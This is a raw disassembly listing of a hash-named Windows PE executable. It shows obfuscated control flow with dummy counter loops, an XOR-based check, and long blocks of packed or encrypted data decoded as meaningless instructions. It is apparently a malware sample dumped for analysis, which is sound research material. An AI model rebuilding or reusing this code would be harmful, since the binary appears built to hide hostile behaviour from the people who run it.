
ddac1ca02b6c9167c75149cd3f723f1d3104a553d61a961137030a224297b3be.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	sbb    DWORD PTR ds:0x43478b,ecx
  40100c:	mov    eax,ds:0x414afe
  401011:	mov    eax,DWORD PTR [eax+0x198]
  401017:	mov    DWORD PTR [ebp-0x8],eax
  40101a:	add    eax,DWORD PTR ds:0x434663
  401020:	mov    eax,DWORD PTR [ebp+0x8]
  401023:	dec    DWORD PTR ds:0x4346d3
  401029:	mov    ecx,DWORD PTR [ebp-0x8]
  40102c:	sbb    DWORD PTR ds:0x434673,0x4346c7
  401036:	push   ebx
  401037:	push   esi
  401038:	sub    DWORD PTR ds:0x43478b,ebx
  40103e:	mov    esi,0x7510851
  401043:	mov    DWORD PTR ds:0x4346bb,0x10
  40104d:	cmp    DWORD PTR ds:0x4346bb,0x0
  401054:	je     0x4010ad
  40105a:	cmp    DWORD PTR ds:0x4346bb,0x2
  401061:	jne    0x40107b
  401067:	push   DWORD PTR [ebp-0x1c]
  40106a:	push   DWORD PTR [ebp-0x18]
  40106d:	push   DWORD PTR [ebp-0x24]
  401070:	push   0x7fb5
  401075:	call   DWORD PTR ds:0x4130b4
  40107b:	cmp    DWORD PTR ds:0x4346bb,0x3
  401082:	jne    0x401095
  401088:	mov    ebx,DWORD PTR ds:0x4346bb
  40108e:	dec    ebx
  40108f:	mov    DWORD PTR ds:0x4346bb,ebx
  401095:	mov    ebx,DWORD PTR ds:0x4346bb
  40109b:	dec    ebx
  40109c:	mov    DWORD PTR ds:0x4346bb,ebx
  4010a2:	jmp    0x40104d
  4010a7:	adc    DWORD PTR ds:0x43478f,ecx
  4010ad:	xor    eax,esi
  4010af:	push   edi
  4010b0:	mov    edi,DWORD PTR ds:0x4346df
  4010b6:	mov    ebx,DWORD PTR ds:0x4347b3
  4010bc:	sub    ebx,edi
  4010be:	imul   edi,DWORD PTR [edi+ebx*1]
  4010c2:	mov    edi,0x327299
  4010c7:	adc    DWORD PTR ds:0x434687,0x43470b
  4010d1:	add    eax,edi
  4010d3:	and    DWORD PTR ds:0x43470f,0x0
  4010dd:	jmp    0x4010ef
  4010e2:	mov    ebx,DWORD PTR ds:0x43470f
  4010e8:	inc    ebx
  4010e9:	mov    DWORD PTR ds:0x43470f,ebx
  4010ef:	cmp    DWORD PTR ds:0x43470f,0x1d
  4010f6:	jae    0x401312
  4010fc:	cmp    DWORD PTR ds:0x43470f,0xe
  401103:	jne    0x401119
  401109:	push   0x43466b
  40110e:	push   0x4349db
  401113:	call   DWORD PTR ds:0x41332c
  401119:	cmp    DWORD PTR ds:0x43470f,0xd
  401120:	jne    0x401133
  401126:	mov    ebx,DWORD PTR ds:0x43470f
  40112c:	inc    ebx
  40112d:	mov    DWORD PTR ds:0x43470f,ebx
  401133:	jmp    0x4010e2
  401138:	or     DWORD PTR ds:0x43466b,ebx
  40113e:	jmp    0x401312
  401143:	test   ah,ch
  401145:	push   edx
  401146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401147:	jb     0x4010fd
  401149:	jl     0x401137
  40114b:	pop    eax
  40114c:	or     eax,0x2d4e1829
  401151:	ins    BYTE PTR es:[edi],dx
  401152:	inc    esi
  401153:	jle    0x4011d3
  401155:	jle    0x4011d5
  401157:	mov    ch,0x7f
  401159:	jle    0x4011d9
  40115b:	into   
  40115c:	xlat   BYTE PTR ds:[ebx]
  40115d:	cmp    ecx,edx
  40115f:	(bad)
  401162:	(bad)  
  401164:	pop    es
  401165:	add    BYTE PTR [ebx],al
  401167:	cvttps2pi mm1,QWORD PTR [edi+ecx*1]
  40116b:	xor    ecx,DWORD PTR [edi]
  40116d:	int3   
  40116e:	and    al,0xc7
  401170:	sbb    al,0x1f
  401172:	inc    ebp
  401173:	fs or  al,0xb7
  401176:	(bad)  [esi]
  401178:	out    dx,eax
  401179:	mov    ecx,0x8e03d6db
  40117e:	es mov esi,0x114da2f0
  401184:	test   eax,0x661f46de
  401189:	call   0x985d1cfd
  40118e:	add    al,0xd6
  401190:	dec    esp
  401191:	stos   BYTE PTR es:[edi],al
  401192:	push   ebx
  401193:	sub    ebp,ebx
  401195:	sar    BYTE PTR [eax],0xa9
  401198:	mov    bh,BYTE PTR [ebx-0x3f]
  40119b:	stos   DWORD PTR es:[edi],eax
  40119c:	push   es
  40119d:	rcl    bl,0x8d
  4011a0:	test   esi,edx
  4011a2:	pushf  
  4011a3:	(bad)
  4011a6:	mov    esi,ebp
  4011a8:	dec    edi
  4011a9:	out    0xa6,al
  4011ab:	dec    ebp
  4011ac:	call   DWORD PTR [edi-0x254af85c]
  4011b2:	mov    ecx,0x5136e949
  4011b7:	and    esi,DWORD PTR [edx-0x47619116]
  4011bd:	jnp    0x4011dc
  4011bf:	ret    
  4011c0:	xchg   edx,eax
  4011c1:	sub    eax,0xc25eebd0
  4011c6:	loopne 0x40120c
  4011c8:	cld    
  4011c9:	jmp    0xd761:0x70cf3d92
  4011d0:	sub    al,0xc9
  4011d2:	add    ah,ch
  4011d4:	sbb    eax,0x331a65d
  4011d9:	outs   dx,DWORD PTR ds:[esi]
  4011da:	ins    DWORD PTR es:[edi],dx
  4011db:	add    al,0x14
  4011dd:	cmp    eax,0x34508ed9
  4011e2:	jno    0x401263
  4011e4:	(bad)
  4011e9:	or     ebx,DWORD PTR [ebx+0x51]
  4011ec:	(bad)  
  4011ee:	adc    eax,0x25e558d3
  4011f3:	jge    0x401193
  4011f5:	inc    esi
  4011f6:	dec    ebx
  4011f7:	aaa    
  4011f8:	adc    DWORD PTR [ebx],ebp
  4011fa:	ja     0x401231
  4011fc:	sbb    dl,bl
  4011fe:	ds dec edi
  401200:	hlt    
  401201:	leave  
  401202:	mov    al,ds:0x4865931a
  401207:	push   ebx
  401208:	push   cs
  401209:	xchg   esi,eax
  40120a:	mov    dh,bh
  40120c:	mov    ds:0x5d2fb3c7,al
  401211:	mov    ebx,0xd030a771
  401216:	stos   DWORD PTR es:[edi],eax
  401217:	xchg   BYTE PTR [ebp+edi*8+0x68],dl
  40121b:	and    ah,ah
  40121d:	ins    BYTE PTR es:[edi],dx
  40121e:	in     al,dx
  40121f:	xchg   edx,eax
  401220:	mov    eax,ds:0x663718c1
  401225:	mov    bl,0xad
  401227:	test   esi,edi
  401229:	xchg   edx,eax
  40122a:	jnp    0x4011b2
  40122c:	jl     0x4011e0
  40122e:	sub    DWORD PTR [eax+ebx*8],0xb6797df0
  401235:	mov    edx,0xdf86950
  40123a:	icebp  
  40123b:	aaa    
  40123c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40123d:	into   
  40123e:	loop   0x40124c
  401240:	pop    ecx
  401241:	add    DWORD PTR [esi+0x628cb182],0x7a
  401248:	mov    ds:0xa3232271,al
  40124d:	add    eax,edx
  40124f:	cmp    ah,BYTE PTR [ebx-0x1d7f5c56]
  401255:	jge    0x4012c1
  401257:	rol    DWORD PTR [edi+0x23],1
  40125a:	das    
  40125b:	jno    0x401270
  40125d:	sbb    bl,BYTE PTR [ecx+0x29]
  401260:	push   ebx
  401261:	jecxz  0x40126e
  401263:	dec    esi
  401264:	pop    esp
  401265:	sub    esp,0x5f
  401268:	dec    esp
  401269:	push   es
  40126a:	push   edx
  40126b:	ret    0x7bf1
  40126e:	shr    ebx,0xef
  401271:	inc    BYTE PTR [esi+0x6a1f8e47]
  401277:	adc    ebp,DWORD PTR [ebx+0x22]
  40127a:	push   esp
  40127b:	ret    
  40127c:	pop    ebp
  40127d:	ins    WORD PTR es:[edi],dx
  40127f:	mov    ch,0x99
  401281:	mov    esp,edi
  401283:	xor    dl,BYTE PTR [ecx+0x73]
  401286:	fsubr  DWORD PTR [ecx]
  401288:	ins    DWORD PTR es:[edi],dx
  401289:	and    BYTE PTR [eax+eiz*4],bl
  40128c:	rcr    cl,1
  40128e:	icebp  
  40128f:	inc    ebx
  401290:	xchg   edx,eax
  401291:	xor    al,0xfe
  401293:	push   0x18
  401295:	mov    eax,0x794ac1cc
  40129a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40129b:	mov    ebp,0xf2b9e47f
  4012a0:	xlat   BYTE PTR ds:[ebx]
  4012a1:	xchg   esp,eax
  4012a2:	test   DWORD PTR [ecx+0x76a07892],0x5214fab5
  4012ac:	lods   eax,DWORD PTR ds:[esi]
  4012ad:	mov    ch,0x53
  4012af:	mov    bl,0x21
  4012b1:	mov    DWORD PTR [ebp+0x4b],esi
  4012b4:	cs in  eax,0x98
  4012b7:	es cmp eax,0x872c6984
  4012bd:	(bad)  
  4012be:	shr    DWORD PTR [eax-0x7bdd06c2],1
  4012c4:	stc    
  4012c5:	(bad)  
  4012c6:	sti    
  4012c7:	scas   al,BYTE PTR es:[edi]
  4012c8:	jne    0x401300
  4012ca:	sbb    ch,BYTE PTR [ebx-0x17]
  4012cd:	sbb    BYTE PTR [ebx+0xc],bl
  4012d0:	retf   0x4836
  4012d3:	cld    
  4012d4:	jne    0x4012ba
  4012d6:	or     ebp,DWORD PTR [ebx-0x28]
  4012d9:	sub    BYTE PTR [ecx],bh
  4012db:	mov    BYTE PTR [ebp-0x64bc7b21],bl
  4012e1:	adc    DWORD PTR [ebx-0x5930deb0],edi
  4012e7:	sti    
  4012e8:	fs dec eax
  4012ea:	or     eax,DWORD PTR [edi]
  4012ec:	outs   dx,DWORD PTR ds:[esi]
  4012ed:	scas   eax,DWORD PTR es:[edi]
  4012ee:	ret    0x93d
  4012f1:	cdq    
  4012f2:	lock stos DWORD PTR es:[edi],eax
  4012f4:	fnstenv [esi-0x59e369d0]
  4012fa:	pop    ds
  4012fb:	stos   BYTE PTR es:[edi],al
  4012fc:	inc    esi
  4012fd:	daa    
  4012fe:	in     al,0xb2
  401300:	mov    dl,0xdf
  401302:	enter  0xed6c,0x31
  401306:	cmp    al,0xbe
  401308:	pop    edx
  401309:	mov    bl,0x6f
  40130b:	sub    al,0x4e
  40130d:	aas    
  40130e:	sub    dl,BYTE PTR [esi+0x7e]
  401311:	jmp    0x40129c
  401313:	add    DWORD PTR [ecx+0x1222d1],eax
  401319:	add    BYTE PTR [ebp+0x3581fc45],cl
  40131f:	inc    DWORD PTR [esi+0x43]
  401322:	add    ah,bl
  401324:	push   ebx
  401325:	add    BYTE PTR [eax],al
  401327:	mov    DWORD PTR [ebp-0x10],eax
  40132a:	adc    DWORD PTR ds:0x4346bf,edi
  401330:	mov    eax,DWORD PTR [ebp+0x8]
  401333:	or     DWORD PTR ds:0x43466f,0x434663
  40133d:	mov    ecx,DWORD PTR [ebp-0x10]
  401340:	xor    DWORD PTR ds:0x434673,ebx
  401346:	xor    eax,esi
  401348:	neg    ebx
  40134a:	add    eax,edi
  40134c:	mov    DWORD PTR [ecx],eax
  40134e:	mov    DWORD PTR [ebp-0x14],0xf89c8536
  401355:	lea    eax,[ebp-0x14]
  401358:	sbb    ecx,ecx
  40135a:	mov    DWORD PTR [ebp-0x20],eax
  40135d:	mov    eax,DWORD PTR [ebp-0x14]
  401360:	mov    ecx,DWORD PTR [ebp-0x20]
  401363:	and    DWORD PTR ds:0x434743,0x0
  40136d:	xor    ebx,ebx
  40136f:	add    ebx,DWORD PTR ds:0x434743
  401375:	inc    ebx
  401376:	mov    DWORD PTR ds:0x434743,ebx
  40137c:	cmp    DWORD PTR ds:0x434743,0x9
  401383:	jne    0x401394
  401389:	push   0x3702
  40138e:	call   DWORD PTR ds:0x4130b8
  401394:	cmp    DWORD PTR ds:0x434743,0x8
  40139b:	jne    0x4013ae
  4013a1:	mov    ebx,DWORD PTR ds:0x434743
  4013a7:	inc    ebx
  4013a8:	mov    DWORD PTR ds:0x434743,ebx
  4013ae:	cmp    DWORD PTR ds:0x434743,0x1c
  4013b5:	jb     0x40136d
  4013bb:	add    DWORD PTR ds:0x4346bf,ecx
  4013c1:	xor    eax,esi
  4013c3:	add    eax,edi
  4013c5:	mov    DWORD PTR [ecx],eax
  4013c7:	dec    DWORD PTR ds:0x43470b
  4013cd:	mov    eax,ds:0x414bd2
  4013d2:	mov    ebx,0x8e12febf
  4013d7:	mov    DWORD PTR [ebp-0xc],ebx
  4013da:	sbb    DWORD PTR ds:0x43466f,0x4346bf
  4013e4:	mov    eax,DWORD PTR [eax]
  4013e6:	adc    DWORD PTR ds:0x43466b,0x434777
  4013f0:	mov    cx,WORD PTR [ebp-0x4]
  4013f4:	xor    DWORD PTR ds:0x434683,0x1391
  4013fe:	movzx  ecx,cx
  401401:	add    ecx,DWORD PTR [eax]
  401403:	mov    DWORD PTR [ebp-0x18],ecx
  401406:	jmp    0x4015da
  40140b:	fisub  DWORD PTR [esi]
  40140d:	add    BYTE PTR [ecx],0x42
  401410:	lods   eax,DWORD PTR ds:[esi]
  401411:	gs in  eax,dx
  401413:	aam    0x1e
  401415:	dec    edx
  401416:	xchg   DWORD PTR [edx-0x4a7d6738],esi
  40141c:	jg     0x40149c
  40141e:	jle    0x4013d5
  401420:	jg     0x4014a0
  401422:	jle    0x401475
  401424:	push   edx
  401425:	shl    edi,0xef
  401428:	dec    edi
  401429:	(bad)  
  40142c:	out    dx,al
  40142d:	push   DWORD PTR [bp+si-0x540d]
  401432:	into   
  401433:	in     eax,dx
  401434:	lahf   
  401435:	(bad)  
  401436:	shr    DWORD PTR [ecx+eax*2+0x65c7de05],cl
  40143d:	dec    eax
  40143e:	mov    dl,0xa9
  401440:	adc    eax,DWORD PTR [edx+esi*1]
  401443:	fimul  WORD PTR ds:0x6b580a9f
  401449:	pop    es
  40144a:	ret    
  40144b:	sbb    ah,BYTE PTR [edx+ecx*2+0x68a6afc]
  401452:	mov    bh,0x62
  401454:	(bad)  
  401455:	out    0x1b,al
  401457:	adc    DWORD PTR [edi-0x47dff402],eax
  40145d:	stos   DWORD PTR es:[edi],eax
  40145e:	dec    ebp
  40145f:	cld    
  401460:	push   eax
  401461:	or     eax,0x6befd17
  401466:	icebp  
  401467:	retf   0x764b
  40146a:	sbb    eax,0x24ab3625
  40146f:	inc    ecx
  401470:	add    DWORD PTR [ebx],esi
  401472:	and    edx,ebp
  401474:	icebp  
  401475:	icebp  
  401476:	sbb    eax,0x40f28d13
  40147b:	cmp    DWORD PTR [ebp-0x72],0xfffffff2
  40147f:	int3   
  401480:	call   0xcdc5b545
  401485:	popf   
  401486:	ss aad 0xdd
  401489:	pop    esi
  40148a:	pop    ecx
  40148b:	sbb    bl,BYTE PTR [esi-0x6b]
  40148e:	in     al,dx
  40148f:	cs mov bl,0xfb
  401492:	pushf  
  401493:	xlat   BYTE PTR ds:[ebx]
  401494:	adc    al,0xce
  401496:	add    BYTE PTR ds:0x93baadb4,ch
  40149c:	shl    BYTE PTR [edx+0x15b24187],cl
  4014a2:	xor    al,0x14
  4014a4:	push   esp
  4014a5:	call   0xd720:0x3b7d8e98
  4014ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014ad:	xor    eax,0xb62c6987
  4014b2:	fild   QWORD PTR [ebx-0x38081ec]
  4014b8:	aad    0x85
  4014ba:	inc    esi
  4014bb:	xchg   esp,eax
  4014bc:	or     al,0x2c
  4014be:	sbb    eax,0xbe88dbc8
  4014c3:	and    eax,0xe75217b6
  4014c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014c9:	push   0x58bba4f0
  4014ce:	sub    eax,0x2048c5e1
  4014d3:	out    0x4f,al
  4014d5:	ss ins DWORD PTR es:[edi],dx
  4014d7:	cmp    BYTE PTR [esi],0xb8
  4014da:	shl    DWORD PTR [edx],1
  4014dc:	mov    esi,0x351144dd
  4014e1:	add    eax,0xf9ecb19c
  4014e6:	adc    ecx,DWORD PTR [ebx]
  4014e8:	mov    ebx,0xc8e535b6
  4014ed:	inc    edx
  4014ee:	and    DWORD PTR [ebp+0x49f1c1aa],eax
  4014f4:	mov    ch,0x2b
  4014f6:	pop    es
  4014f7:	out    0xcc,eax
  4014f9:	dec    esi
  4014fa:	jbe    0x401486
  4014fc:	call   0xd379:0xff92e36f
  401503:	popf   
  401504:	stc    
  401505:	push   ecx
  401506:	jo     0x4014b5
  401508:	scas   al,BYTE PTR es:[edi]
  401509:	sbb    dl,0xc3
  40150c:	pop    es
  40150d:	ds inc eax
  40150f:	ror    DWORD PTR [edi+0x4b],1
  401512:	or     al,0x26
  401514:	cs mov eax,0xe53378bc
  40151a:	mov    edx,0x2ef79b67
  40151f:	data16 (bad) 
  401521:	sub    DWORD PTR [edx],edi
  401523:	xchg   edi,eax
  401524:	add    al,0x5d
  401526:	sbb    BYTE PTR [ebp+0x69],dl
  401529:	cmp    DWORD PTR es:[edi+0x2a0b4cf0],ebp
  401530:	push   esp
  401531:	sub    al,0xda
  401533:	or     al,0x34
  401535:	jnp    0x401541
  401537:	popf   
  401538:	dec    esp
  401539:	pop    esi
  40153a:	sub    edx,edx
  40153c:	jne    0x401517
  40153e:	shl    BYTE PTR [esi+0x310c3cab],1
  401544:	ss pop ds
  401546:	xchg   DWORD PTR [edi-0x64],ebx
  401549:	and    BYTE PTR [eax+0x12],0x9f
  40154d:	cmp    DWORD PTR [ebx],edi
  40154f:	bound  eax,QWORD PTR [eax-0x60]
  401552:	mul    DWORD PTR [edi-0x4ec8a04]
  401558:	jo     0x40156c
  40155a:	pop    ebp
  40155b:	hlt    
  40155c:	and    al,0xcb
  40155e:	adc    BYTE PTR [ecx],dh
  401560:	sbb    edx,DWORD PTR [ebx+0x11]
  401563:	push   0x7bed1101
  401568:	ins    DWORD PTR es:[edi],dx
  401569:	push   ecx
  40156a:	adc    BYTE PTR [edi-0x6a185cd9],ch
  401570:	pusha  
  401571:	xchg   ebx,eax
  401572:	cmc    
  401573:	lahf   
  401574:	and    BYTE PTR [edx-0x6e03a8e9],dh
  40157a:	bound  ecx,QWORD PTR [ebx]
  40157c:	xchg   edx,eax
  40157d:	xchg   edi,eax
  40157e:	(bad)  
  40157f:	mov    eax,fs:0xceb76ea8
  401585:	repz cmp DWORD PTR ds:[eax],edx
  401589:	xor    BYTE PTR ds:[edx+0x5f],dh
  40158d:	bswap  ebp
  40158f:	xchg   edi,eax
  401590:	out    dx,eax
  401591:	pop    edx
  401592:	pop    es
  401593:	or     eax,0xfa310977
  401598:	ins    BYTE PTR es:[edi],dx
  401599:	jne    0x4015e6
  40159b:	push   ecx
  40159c:	sub    ebx,esp
  40159e:	pop    edi
  40159f:	shr    DWORD PTR [ecx+0x67],cl
  4015a2:	pop    edi
  4015a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015a4:	jno    0x401559
  4015a6:	pop    edx
  4015a7:	loope  0x4015f6
  4015a9:	mov    edi,DWORD PTR [ebp+eax*4+0x1e1ad0a7]
  4015b0:	push   esp
  4015b1:	add    bl,cl
  4015b3:	push   ss
  4015b4:	aam    0x5e
  4015b6:	ja     0x40153f
  4015b8:	jne    0x4015d8
  4015ba:	pop    ecx
  4015bb:	push   esi
  4015bc:	lahf   
  4015bd:	adc    al,0x1f
  4015bf:	pusha  
  4015c0:	repz sbb al,0xbd
  4015c3:	xchg   esp,eax
  4015c4:	ins    BYTE PTR es:[edi],dx
  4015c5:	push   es
  4015c6:	fs arpl bx,dx
  4015c9:	adc    eax,0x150f8a4e
  4015ce:	rcl    ebx,1
  4015d0:	test   esi,0x62987783
  4015d6:	icebp  
  4015d7:	mov    ebx,0x458bf703
  4015dc:	or     BYTE PTR [ebx+0x43478f0d],cl
  4015e2:	add    BYTE PTR [ecx],ah
  4015e4:	or     eax,0x43473f
  4015e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4015ec:	xor    eax,esi
  4015ee:	add    DWORD PTR ds:0x434663,0x598
  4015f8:	add    eax,edi
  4015fa:	mov    DWORD PTR ds:0x4346c3,0x7c6b
  401604:	cmp    DWORD PTR [ecx],eax
  401606:	mov    DWORD PTR ds:0x434713,0x6dd9
  401610:	jne    0x40227a
  401616:	and    DWORD PTR ds:0x434703,0x0
  401620:	mov    ecx,DWORD PTR ds:0x434703
  401626:	inc    ecx
  401627:	mov    DWORD PTR ds:0x434703,ecx
  40162d:	cmp    DWORD PTR ds:0x434703,0x4
  401634:	jne    0x401645
  40163a:	push   0x2f81
  40163f:	call   DWORD PTR ds:0x413270
  401645:	cmp    DWORD PTR ds:0x434703,0x3
  40164c:	jne    0x40165f
  401652:	mov    ecx,DWORD PTR ds:0x434703
  401658:	inc    ecx
  401659:	mov    DWORD PTR ds:0x434703,ecx
  40165f:	cmp    DWORD PTR ds:0x434703,0x14
  401666:	jb     0x401620
  40166c:	xor    ecx,ecx
  40166e:	or     ecx,DWORD PTR ds:0x4346a3
  401674:	mov    eax,ds:0x4346eb
  401679:	sub    eax,ecx
  40167b:	and    ecx,DWORD PTR [ecx+eax*1]
  40167e:	mov    eax,DWORD PTR [ebp+0x8]
  401681:	mov    ecx,DWORD PTR [ebp-0x18]
  401684:	add    DWORD PTR ds:0x43474b,0x434777
  40168e:	xor    eax,esi
  401690:	or     DWORD PTR ds:0x43466b,0x526e
  40169a:	add    eax,edi
  40169c:	mov    DWORD PTR ds:0x43466f,0x6068
  4016a6:	cmp    DWORD PTR [ecx],eax
  4016a8:	jmp    0x40187c
  4016ad:	cmp    dh,BYTE PTR [esi]
  4016af:	sub    eax,0x6255fdb9
  4016b4:	mov    ebp,0xf85a51d5
  4016b9:	bound  edx,QWORD PTR [ecx+0x79ec0d55]
  4016bf:	jle    0x40173f
  4016c1:	mov    ch,0x7f
  4016c3:	jle    0x401743
  4016c5:	mov    dl,0xa9
  4016c7:	clc    
  4016c8:	(bad)  
  4016c9:	jmp    0xdd03ba4c
  4016ce:	pop    edx
  4016cf:	hlt    
  4016d0:	mov    ds,WORD PTR [ecx-0x763d46b9]
  4016d6:	jg     0x4016f1
  4016d8:	imul   esi,esi,0x242669c5
  4016de:	cmp    DWORD PTR [edi+edx*8-0x49155a85],eax
  4016e5:	cwde   
  4016e6:	xlat   BYTE PTR ds:[ebx]
  4016e8:	mov    bl,0xf7
  4016ea:	or     ebp,DWORD PTR [ebx]
  4016ec:	push   esp
  4016ed:	push   ss
  4016ee:	fsubr  QWORD PTR [eax-0x4b4a391e]
  4016f4:	push   es
  4016f5:	idiv   DWORD PTR [esp+eiz*4+0x60]
  4016f9:	pop    eax
  4016fa:	mov    dh,0x48
  4016fc:	pushf  
  4016fd:	jbe    0x4016ae
  4016ff:	jne    0x4016fb
  401701:	xchg   ebx,eax
  401702:	add    cl,BYTE PTR [edi]
  401704:	fwait
  401705:	lea    edx,[ebx+0xd]
  401708:	daa    
  401709:	xchg   esp,eax
  40170a:	fsubr  st(6),st
  40170c:	test   BYTE PTR [eax+0x7],dh
  40170f:	jecxz  0x401758
  401711:	dec    ebx
  401712:	jne    0x4016ed
  401714:	mov    ah,0xb1
  401716:	jmp    0x2b7b:0x46422988
  40171d:	imul   esi,DWORD PTR [eax+0x417ecb46],0x8
  401724:	jns    0x4017a2
  401726:	cli    
  401727:	or     BYTE PTR [eax+ecx*8+0x61],dl
  40172b:	mov    BYTE PTR [ebx],dh
  40172d:	in     al,dx
  40172e:	cdq    
  40172f:	and    BYTE PTR [eax-0x3fa549c],ch
  401735:	out    dx,eax
  401736:	mov    ah,0x16
  401738:	fistp  QWORD PTR [ebp-0xb]
  40173b:	push   ebp
  40173c:	dec    eax
  40173d:	gs jge 0x401777
  401740:	dec    DWORD PTR [ebp-0x21]
  401743:	ss jae 0x4017ab
  401746:	(bad)  
  401747:	cmp    eax,0xb04257af
  40174c:	loop   0x401715
  40174e:	sbb    DWORD PTR [ebp+0x529d29dc],0xffffff8c
  401755:	dec    esi
  401756:	shl    BYTE PTR [esi-0x7df0b937],0x6d
  40175d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40175e:	mov    esi,0xdb7a5775
  401763:	xchg   esi,eax
  401764:	xchg   ebp,eax
  401765:	stos   DWORD PTR es:[edi],eax
  401766:	and    DWORD PTR [edx+0x4eefbc80],0x13
  40176d:	pop    es
  40176e:	push   es
  40176f:	xchg   ebp,eax
  401770:	fs dec ebp
  401772:	in     eax,dx
  401773:	jmp    DWORD PTR [ebp+0x1429e48d]
  401779:	popa   
  40177a:	mov    WORD PTR [edi+0x2e634513],es
  401780:	mov    bh,0xe9
  401782:	scas   eax,DWORD PTR es:[edi]
  401783:	adc    BYTE PTR [ebp-0x20],al
  401786:	and    ah,bh
  401788:	adc    dh,BYTE PTR [ebx]
  40178a:	jns    0x401802
  40178c:	and    dh,bl
  40178e:	shl    BYTE PTR ds:0x1dfda895,1
  401794:	pop    edi
  401795:	and    eax,0xcaacc072
  40179a:	adc    eax,0xf9bf0164
  40179f:	jmp    0x6b207f99
  4017a4:	test   eax,0xc8e7342d
  4017a9:	les    esp,FWORD PTR [ebx+ebx*4]
  4017ac:	xor    edi,edx
  4017ae:	sbb    al,0xf4
  4017b0:	ins    DWORD PTR es:[edi],dx
  4017b1:	mov    WORD PTR [ebp+0x2b645739],ds
  4017b7:	(bad)  
  4017b8:	add    DWORD PTR [eax],0x755bbf30
  4017be:	jge    0x401776
  4017c0:	jns    0x4017e5
  4017c2:	jnp    0x401779
  4017c4:	loop   0x401814
  4017c6:	ds out 0x9a,eax
  4017c9:	fs xchg esp,eax
  4017cb:	lahf   
  4017cc:	inc    ecx
  4017cd:	stos   BYTE PTR es:[edi],al
  4017ce:	push   eax
  4017cf:	cld    
  4017d0:	enter  0x33ef,0xf0
  4017d4:	lock jne 0x401804
  4017d7:	sbb    dl,ch
  4017d9:	xchg   ebx,eax
  4017da:	and    esp,eax
  4017dc:	xor    edx,DWORD PTR [ebx]
  4017de:	mov    ch,0xe8
  4017e0:	(bad)  
  4017e1:	dec    eax
  4017e2:	lea    ecx,[esi]
  4017e4:	dec    ebx
  4017e5:	xchg   ebp,eax
  4017e6:	adc    ah,BYTE PTR [edi+0x563dbefd]
  4017ec:	push   cs
  4017ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017ee:	xlat   BYTE PTR ds:[ebx]
  4017ef:	int    0xd3
  4017f1:	jo     0x401787
  4017f3:	add    eax,0xa8dee02a
  4017f8:	sub    DWORD PTR [edx],ebp
  4017fa:	int3   
  4017fb:	sbb    ecx,DWORD PTR [esi+0x28d07ac6]
  401801:	retf   0xd670
  401804:	call   0x75d9:0xa5f6cd7c
  40180b:	or     al,0x44
  40180d:	xchg   dl,dl
  40180f:	out    0x74,eax
  401811:	jmp    0x517a2ad9
  401816:	pop    ds
  401817:	call   0xcb0ef1aa
  40181c:	lock or al,0xc5
  40181f:	rol    BYTE PTR [ecx-0x41007a2f],0x1c
  401826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401827:	push   esp
  401828:	stc    
  401829:	in     eax,0xd
  40182b:	in     eax,dx
  40182c:	sub    eax,0x1b6ee569
  401831:	or     cl,BYTE PTR [esi-0x4efaff4d]
  401837:	mov    WORD PTR [edx],cs
  401839:	mov    bl,0xd0
  40183b:	or     al,dl
  40183d:	pop    eax
  40183e:	cmp    ebp,DWORD PTR [ebx-0x11]
  401841:	in     eax,0xf4
  401843:	mov    ds:0xd7c58d22,eax
  401848:	imul   ebx,DWORD PTR [ebx+0x36],0x9
  40184c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40184d:	sub    esp,DWORD PTR [edi+0x58]
  401850:	cmp    cl,BYTE PTR [esi+0xc]
  401853:	jnp    0x401879
  401855:	call   0x5efd:0xc8b8be4d
  40185c:	repz int3 
  40185e:	inc    edx
  40185f:	jl     0x401888
  401861:	inc    ebx
  401862:	ss mov ebx,0xa7393e8e
  401868:	sub    eax,ecx
  40186a:	and    BYTE PTR [edx+0x21c31bcc],dl
  401870:	test   DWORD PTR [edi],edi
  401872:	repz inc eax
  401874:	mov    al,0x3c
  401876:	jl     0x401860
  401878:	(bad)  
  401879:	cld    
  40187a:	pop    ss
  40187b:	xor    cl,BYTE PTR [edi]
  40187d:	test   DWORD PTR [edi],esp
  40187f:	add    al,0x0
  401881:	add    BYTE PTR [ebx+0x4347830d],cl
  401887:	add    BYTE PTR [ecx],cl
  401889:	or     eax,0x434663
  40188e:	jmp    0x401a62
  401893:	or     esi,DWORD PTR [edi+eiz*2-0x2a]
  401897:	popa   
  401898:	(bad)  [ebx+0x728b6c7d]
  40189e:	sbb    cl,dl
  4018a0:	clc    
  4018a1:	repnz fstp DWORD PTR [ebx]
  4018a4:	jnp    0x401924
  4018a6:	jle    0x40185d
  4018a8:	jg     0x401928
  4018aa:	jle    0x401851
  4018ac:	add    dl,BYTE PTR [esi]
  4018ae:	cmp    eax,0xe0bdd85c
  4018b3:	icebp  
  4018b4:	dec    BYTE PTR [eax-0x3b]
  4018b7:	std    
  4018b8:	shr    DWORD PTR [eax],cl
  4018ba:	push   eax
  4018bb:	push   eax
  4018bc:	xchg   ebp,eax
  4018bd:	jne    0x401848
  4018bf:	adc    DWORD PTR [ecx+eiz*2],edx
  4018c2:	dec    ebx
  4018c3:	xor    cl,BYTE PTR [eax]
  4018c5:	xor    BYTE PTR ds:0xe08693e6,bh
  4018cb:	jne    0x4018c8
  4018cd:	inc    esp
  4018ce:	out    0xc3,eax
  4018d0:	or     edi,esi
  4018d2:	cmp    BYTE PTR [ebx-0x560ef055],0x49
  4018d9:	in     eax,0x67
  4018db:	in     al,0xb1
  4018dd:	pop    ecx
  4018de:	int    0xca
  4018e0:	and    BYTE PTR [ebx],0x80
  4018e3:	mov    ebp,0x9dc48031
  4018e8:	adc    BYTE PTR [eax],dl
  4018ea:	xchg   ebx,eax
  4018eb:	in     al,dx
  4018ec:	xlat   BYTE PTR ds:[ebx]
  4018ed:	retf   
